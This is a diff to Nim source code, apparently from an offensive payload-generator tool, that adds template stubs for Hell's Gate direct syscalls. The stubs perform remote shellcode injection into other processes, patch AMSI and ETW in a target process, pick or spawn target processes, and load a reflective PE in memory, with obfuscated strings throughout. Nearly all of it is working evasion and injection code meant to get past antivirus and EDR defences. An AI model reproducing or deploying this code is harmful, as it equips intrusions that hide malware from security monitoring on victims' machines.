@@ -11,6 +11,24 @@ proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits
         ret
     ===
 
+var 
+  ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
+  ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
+"""
+
+let HellsgateNtOpenProcessDelegate*  = """
+
+proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        syscall
+        ret
+    ===
+
+var 
+  ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
+  ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)
 
 """
 
@@ -25,6 +43,10 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
         ret
     ===
 
+var 
+  ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
+  ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
+
 """
 
 let HellsgateProtectDelegate*  = """
@@ -38,9 +60,33 @@ proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSiz
         ret
     ===
 
+var 
+  ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
+  ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
+
 """
 
 let HellsgateNtCreateThreadExDelegate*  = """
+
+type
+  PS_ATTR_UNION* {.pure, union.} = object
+    Value*: ULONG
+    ValuePtr*: PVOID
+  PS_ATTRIBUTE* {.pure.} = object
+    Attribute*: ULONG 
+    Size*: SIZE_T
+    u1*: PS_ATTR_UNION
+    ReturnLength*: PSIZE_T
+  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
+  PS_ATTRIBUTE_LIST* {.pure.} = object
+    TotalLength*: SIZE_T
+    Attributes*: array[2, PS_ATTRIBUTE]
+  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
+  KNORMAL_ROUTINE* {.pure.} = object
+    NormalContext*: PVOID
+    SystemArgument1*: PVOID
+    SystemArgument2*: PVOID
+  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
 
 proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm ===
@@ -49,6 +95,10 @@ proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectA
         syscall
         ret
     ===
+
+var 
+  ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
+  ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)
 
 """
 
@@ -62,6 +112,10 @@ proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
         syscall
         ret
     ===
+
+var 
+  ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
+  ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)
 
 """
 
@@ -98,17 +152,6 @@ proc ntdllunhook(): bool =
   hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
   var status = 0
        
-  var 
-    ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
-    ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
-
-  var 
-    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
-    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
-
-  var 
-    ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
-    ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)
 
   for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
       hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
@@ -170,8 +213,6 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
         var pHandle: HANDLE = getCurrentProcess()
         
         var 
-            ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
-            ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
             dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
@@ -215,6 +256,76 @@ when isMainModule:
      pwndemHellsGateLike(dectext)
 """
 
+let HellsgateRemotePatchAMSIStub* = """
+
+proc RemotePatchAmsi(hProcss :HANDLE): bool =
+
+    when defined amd64:
+        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+    elif defined i386:
+        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+
+
+    var disabled: bool = false
+   
+    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
+    if RemoteHandle == 0:
+        echo obf("[X] Failed to get amsi.dll handle")
+        return disabled
+
+    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
+    if RemoteProc == NULL:
+        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
+        return disabled
+
+    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+        echo obf("Failed to write process memory")
+        return disabled
+    else:
+        disabled = true
+    return disabled
+
+when isMainModule:
+    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    success = RemotePatchAmsi(hProcams)
+    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
+
+"""
+
+let HellsgateRemotePatchETWStub* = """
+
+proc RemotePatchEtw(hProcess : HANDLE) : bool =
+
+    when defined amd64:
+        let patch: array[1, byte] = [byte 0xc3]
+    elif defined i386:
+        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
+
+    
+    var disabled: bool = false
+    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
+    if RemoteHandle == 0:
+        echo obf("[X] Failed to get ntdll.dll handle")
+        return disabled
+
+    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
+    if RemoteProc == NULL:
+        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
+        return disabled
+
+    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+        echo obf("Failed to write process memory")
+        return disabled
+    else:
+        disabled = true
+    return disabled
+
+when isMainModule:
+    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    success = RemotePatchEtw(hProcetw)
+    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
+
+"""
 
 let HellsgateAMSIPatchStub*  = """
 
@@ -251,8 +362,6 @@ proc PatchAmsi(): bool =
     var pHandle: HANDLE = getCurrentProcess()
         
     var 
-        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
-        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
 
@@ -270,8 +379,6 @@ proc PatchAmsi(): bool =
         echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
     var 
-        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
-        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
         bytesWritten: SIZE_T
 
     if getSyscall(ntWriteTable):
@@ -348,8 +455,6 @@ proc Patchntdll(): bool =
     var pHandle: HANDLE = getCurrentProcess()
         
     var 
-        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
-        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
 
@@ -367,8 +472,6 @@ proc Patchntdll(): bool =
         echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
     var 
-        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
-        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
         bytesWritten: SIZE_T
 
     if getSyscall(ntWriteTable):
@@ -407,6 +510,398 @@ when isMainModule:
 
 """
 
+let HellsgateNotepadProcIDStub * = """
+
+# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+let tProcess = startProcess(obf("notepad.exe"))
+tProcess.suspend() # That's handy!
+tProcess.close()
+
+echo obf("[*] Target Process: "), tProcess.processID
+var remoteProcID = DWORD(tProcess.processID)
+
+"""
+
+let HellsShellcoderemoteinjectStub_notepad * = """
+proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
+
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = tProcess.processID
+
+"""
+
+let HellsShellcoderemoteinjectStub * = """
+    
+    let tProcess2 = GetCurrentProcessId()
+    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+
+    var oldProtection: DWORD = 0
+
+
+    var status: NTSTATUS
+    var success: BOOL
+
+    if getSyscall(ntOpenTable):
+        syscall = ntOpenTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtOpenProcess")
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+
+    var bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+
+    if getSyscall(ntCreateTable):
+        syscall = ntCreateTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        ds, 
+        NULL, FALSE, 0, 0, 0, NULL)
+
+    if getSyscall(ntCloseTable):
+        syscall = ntCloseTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtClose")
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+
+    echo success
+   
+
+when isMainModule:
+     injectCreateRemoteThread(dectext)
+
+"""
+
+let HellsShellcoderemoteinjectStub_customprocfirst * = fmt"""
+
+var remoteProcID: DWORD = 0
+
+from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA
+
+proc FindPidByName * (processName : string):DWORD =
+    try:
+        var 
+            entry : PROCESSENTRY32A
+            snapshot : HANDLE
+            pid : DWORD = 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot != INVALID_HANDLE_VALUE:
+            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+            if Process32FirstA(snapshot,addr entry):
+                while Process32NextA(snapshot,addr entry):
+                    pid = entry.th32ProcessID
+                    if ($(entry.szExeFile).join()).contains(processName):
+                        result = pid
+    except: 
+        echo obf("Process ID not found")
+
+var processID: DWORD
+var found: bool = false
+
+"""
+
+let HellsShellcoderemoteinjectStub_customprocID * = """
+
+for m in remoteprocesses:
+    if found == true: continue
+    echo obf("Checking: ") & $m
+    processID = FindPidByName(m)
+    if (processID):
+        found = true
+
+echo obf("[*] Target Process: "), processID
+remoteProcID = processID
+
+"""
+
+let HellsShellcoderemoteinjectStub_customprocthird * = fmt"""
+proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
+
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+"""
+
+let HellsPELoadStub * = """
+
+from winim import size_t
+
+proc getNtHdrs*(pe_buffer: ptr BYTE): ptr BYTE =
+    if pe_buffer == nil:
+      return nil
+    var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
+    if idh.e_magic != IMAGE_DOS_SIGNATURE:
+      return nil
+    let kMaxOffset: LONG = 1024
+    var pe_offset: LONG = idh.e_lfanew
+    if pe_offset > kMaxOffset:
+      return nil
+    var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
+        cast[ptr BYTE](pe_buffer) + pe_offset))
+    if inh.Signature != IMAGE_NT_SIGNATURE:
+      return nil
+    return cast[ptr BYTE](inh)
+
+proc getPeDir*(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
+    if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
+      return nil
+    var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
+    if nt_headers == nil:
+      return nil
+    var peDir: ptr IMAGE_DATA_DIRECTORY = nil
+    var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
+    peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
+    if peDir.VirtualAddress == 0:
+      return nil
+    return peDir
+
+type
+    BASE_RELOCATION_ENTRY* {.bycopy.} = object
+      Offset* {.bitsize: 12.}: WORD
+      Type* {.bitsize: 4.}: WORD
+
+
+const
+    RELOC_32BIT_FIELD* = 3
+
+proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;moduleSize: SIZE_T): bool =
+    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
+        IMAGE_DIRECTORY_ENTRY_BASERELOC)
+    if relocDir == nil:
+      return false
+    var maxSize: csize_t = csize_t(relocDir.Size)
+    var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
+    var reloc: ptr IMAGE_BASE_RELOCATION = nil
+    var parsedSize: csize_t = 0
+    while parsedSize < maxSize:
+      reloc = cast[ptr IMAGE_BASE_RELOCATION]((
+          size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
+      if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
+        break
+      var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
+          csize_t(sizeof((BASE_RELOCATION_ENTRY)))
+      var page: csize_t = csize_t(reloc.VirtualAddress)
+      var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
+          cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
+      var i: csize_t = 0
+      while i < entriesNum:
+        var offset: csize_t = entry.Offset
+        var entryType: csize_t = entry.Type
+        var reloc_field: csize_t = page + offset
+        if entry == nil or entryType == 0:
+          break
+        if entryType != RELOC_32BIT_FIELD:
+          return false
+        if size_t(reloc_field) >= moduleSize:
+          return false
+        var relocateAddr: ptr csize_t = cast[ptr csize_t]((
+            cast[size_t](modulePtr) + size_t(reloc_field)))
+        (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
+        entry = cast[ptr BASE_RELOCATION_ENTRY]((
+            cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
+        inc(i)
+      inc(parsedSize, reloc.SizeOfBlock)
+    return parsedSize != 0
+
+proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk
+
+proc fixIAT*(modulePtr: PVOID): bool =
+    var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
+        IMAGE_DIRECTORY_ENTRY_IMPORT)
+    if importsDir == nil:
+      return false
+    var maxSize: csize_t = cast[csize_t](importsDir.Size)
+    var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
+    var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
+    var parsedSize: csize_t = 0
+    while parsedSize < maxSize:
+      lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
+          impAddr + parsedSize + cast[uint64](modulePtr)))
+      
+      if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
+        break
+      var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
+      var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
+      var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
+      if thunk_addr == 0:
+        thunk_addr = csize_t(lib_desc.FirstThunk)
+      var offsetField: csize_t = 0
+      var offsetThunk: csize_t = 0
+      while true:
+        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
+            cast[csize_t](modulePtr) + offsetField + call_via))
+        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
+            cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
+        var boolvar: bool
+        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
+          boolvar = true
+        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
+          boolvar = true
+        if (boolvar):
+          var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+          fieldThunk.u1.Function = ULONGLONG(libaddr)
+        if fieldThunk.u1.Function == 0:
+          break
+        if fieldThunk.u1.Function == orginThunk.u1.Function:
+          var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
+          var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
+          
+    
+          var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
+          
+          let asd = byname.Name
+          var hmodule: HMODULE = LoadLibraryA(libname)
+          var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
+          
+    
+          fieldThunk.u1.Function = ULONGLONG(libaddr)
+    
+        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
+        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
+      inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
+    return true
+
+proc pwndem(): void =
+
+    let tProcess2 = GetCurrentProcessId()
+    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    
+    var shellcodePtr: ptr = dectext[0].addr
+
+    var pImageBase: ptr BYTE = nil
+    var preferAddr: LPVOID = nil
+    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
+    if (ntHeader == nil):
+      echo obf("[+] File isn't a PE file.")
+      quit()
+
+    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(shellcodePtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
+    preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
+    
+    echo $ntHeader.OptionalHeader.SizeOfImage
+    
+    var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
+    var ds: LPVOID
+
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+    var status: NTSTATUS = NtAllocateVirtualMemory(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
+    
+    echo obf("NtAllocateVirtualMemory:")
+    echo status
+    
+    
+    if (preferAddr == nil and relocDir == nil):
+      echo obf("[-] Allocate Image Base At Failure.\n")
+      quit()
+    
+    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
+    
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    var bytesWritten: SIZE_T
+    status = NtWriteVirtualMemory(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
+    
+    echo obf("NtWriteVirtualMemory:")
+    echo status
+    
+    
+    var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
+    var i: int = 0
+    while i < cast[int](ntHeader.FileHeader.NumberOfSections):
+      var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
+      var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
+      status = NtWriteVirtualMemory(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+      echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
+      echo status
+      inc(i)
+    
+    var goodrun = fixIAT(preferAddr)
+    
+    if preferAddr != preferAddr:
+      discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
+    var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)
+
+    let f = cast[proc(){.nimcall.}](retAddr)
+    f()
+
+#[
+    var 
+      protectAddress = preferAddr
+      op: ULONG
+      t: ULONG
+    # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
+    status =  NtProtectVirtualMemory(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
+    if (status != 0):
+        echo obf("NtProtectVirtualMemory failed")
+        echo status
+        echo GetLastError()
+    else:
+        echo obf("[*] OldProtect set back")
+
+]#
+
+
+when isMainModule:
+     pwndem()
+
+"""
 
 let HellsgateStub*  = """
 
